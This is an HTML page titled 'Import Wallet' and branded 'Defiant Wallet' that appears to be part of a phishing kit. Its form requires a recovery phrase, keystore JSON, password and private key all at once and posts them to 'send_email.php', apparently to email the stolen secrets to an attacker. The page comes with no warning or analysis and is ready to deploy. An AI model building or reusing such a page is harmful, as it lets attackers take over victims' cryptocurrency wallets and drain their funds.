<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Import Wallet</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
    <link rel="manifest" href="site.html">
</head>
<body>
    <header>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
                    <a class="text-white" href="#" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp; Defiant Wallet</a>
                </div>
            </div>
        </div>
    </header>

    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
                    <!-- Tab panes -->
                    <div class="tab-content">
                        <h4 style="color: white;"></h4>
                        <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                            <form method="post" action="send_email.php">
                                <div class="form-group">
                                    <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
                                </div>
                                <p class="text-secondary" style="margin-top: 10px;"></p>
                                <div class="form-group">
                                    <textarea class="form-control" name="keystore" rows="5" placeholder="Keystore JSON" required=""></textarea>
                                </div>
                                <div class="form-group">
                                    <input class="form-control" type="text" name="password" placeholder="Password" required="">
                                </div>
                                <div class="form-group">
                                    <input class="form-control" name="key" placeholder="Private Key" required="">
                                </div>
                                <input type="hidden" name="value" value="Ethereum">
                                <div class="form-group">
                                    <button class="btn btn-primary btn-block" type="submit" name="submit">Submit</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>
